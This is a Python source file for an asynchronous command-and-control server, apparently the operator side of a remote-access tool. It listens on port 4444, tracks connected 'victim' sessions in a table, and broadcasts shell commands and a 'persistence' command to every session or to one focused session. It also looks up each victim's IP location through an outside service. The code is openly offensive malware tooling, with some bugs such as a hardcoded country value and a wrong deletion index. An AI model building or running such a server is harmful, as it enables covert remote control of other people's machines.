import socket, asyncio
from aioconsole import ainput
from asyncio.queues import Queue
import subprocess
import json
import uuid
from beautifultable import BeautifulTable
import random
import aiohttp.web
import requests
import pathlib
import mysql.connector
import requests
from asyncio.queues import Queue
import logging
PORT = 4444
sessions_table = BeautifulTable()
sessions_table.columns.header = ["SID", "Remote Address"]
# sessions_table.set_style(BeautifulTable.STYLE_COMPACT)
logging.basicConfig(level=logging.ERROR)
asyncio_logger = logging.getLogger('asyncio')
asyncio_logger.setLevel(logging.ERROR)




focus = ""
focus_str = "broadcast"
clients = {}
cmd_list = ["cmd", "ps", "dl", "help", "sessions", "persistence"]
messages_queue = Queue()


async def pmsg(message, escape=True):
    global focus, focus_str
    # Effacer la ligne actuelle (où se trouve le curseur d'input)
    if escape:

        print(f"\r{message}\n{focus_str}> ", end="", flush=True)
    else:
        print(f"\r{message}{focus_str}> ", end="", flush=True)




def banner():
    print("""

  ________    ____                    
 / ___/_  |  / __/__ _____  _____ ____
/ /__/ __/  _\ \/ -_) __/ |/ / -_) __/
\___/____/ /___/\__/_/  |___/\__/_/     
github.com/nxvertime   
                                      


""")



def gen_client(reader, writer, ipv4):
    id = len(clients)
    
    clients[id] = {
        'reader': reader,
        'writer': writer,
        'remote_addr': ipv4
        
                   }
    return id

async def interpreter(cmd):
    if not cmd:
        return {"type": "error", "value": "empty"}
    cmd = cmd.split()
    
    
    cmd_name = cmd[0]
    match cmd_name:
        case "persistence" | "cmd":
            return {"type": "command", "value": {"command": cmd_name, "args": cmd[1:]}}
        case "sessions":
            return {"type": "info", "value": f"{len(clients)} Sessions opened\n{sessions_table}"}
        case "defocus" | "focus" | "help":
            responses = {
                "defocus": "[v] Exiting focus-mode",
                "focus": args[0] if len(args := cmd[1:]) == 1 else -1,
                "help": """
                    -help: display this message
                    -cmd <command> <args>: send a command to every victim
                    -sessions: get current sessions opened
                    -focus <session-id>: focus on one session
                    -defocus: exit focus mode
                    -exit: exit program
                """
            }
            return {"type": "info", "value": responses[cmd_name]}
        case _:
            return {"type": "error", "value": "[x] Error: command not found, type 'help' for more infos"}


async def sendCmd(cmd, sid):
    
    interpreted_command = await interpreter(cmd)
    writer = clients[sid]["writer"]
    reader = clients[sid]["reader"]
    writer.send(str.encode(interpreted_command, 'utf-8'))

async def process_msg():
    while True:

        msg = await messages_queue.get()
        sid = await messages_queue.get()

        try:
            message = msg.decode()
            await pmsg(f"session#{sid}: {msg.decode('utf-8')}", True)
        except UnicodeDecodeError as err:
            await pmsg(f"[x] Error: can't decode response, {err}")





async def handle_commands():
    global focus, focus_str
    
    while True:
        command = await ainput(f"{focus_str}> ")
        if command.lower() == 'exit' and focus == "":
            break
        elif command.lower() == 'defocus' and focus != "":
            focus = ""
            focus_str = "broadcast"

        result = await interpreter(command)

        if result["type"] == "command":
            json_cmd = json.dumps(result["value"], separators=(',', ':'))
            if focus:
                writer = clients[int(focus)]['writer']
                writer.write(str.encode(json_cmd, 'utf-8'))
                await writer.drain()
            else:
                for session_id in clients:
                    writer = clients[session_id]['writer']
                    writer.write(str.encode(json_cmd, 'utf-8'))
                    await writer.drain()
        
        elif result["type"] == "info":
            print(result["value"])
        
        elif result["type"] == "error":
            if result["value"] == "empty":
                pass
            else:
                print(result["value"])

            
        
        



                




async def handle_client(reader, writer):
    client_info = writer.get_extra_info('peername')

    await pmsg(f"[+] New connection from {client_info[0]} ")
    sid = gen_client(reader, writer, client_info[0])

    country = await get_ip_country(client_info[0])
    sessions_table.rows.append([sid, client_info[0]])
    try:
        while True:
            data = await reader.read(4096)
            await messages_queue.put(data)
            await messages_queue.put(sid)
    except ConnectionResetError as err:
        await pmsg(f"session#{sid}: Connection lost")
        del clients[sid]
        s_index = None
        for index, row in enumerate(sessions_table.rows):
            if row[0] == sid:
                s_index = index
                break
        del sessions_table.rows[index]

    




async def get_ip_country(ipv4):
    id = len(clients) -1
    req = requests.get(f'http://ip-api.com/json/{ipv4}')
    res = req.json()
    print(res)
    clients[id]["country"] = "FR"

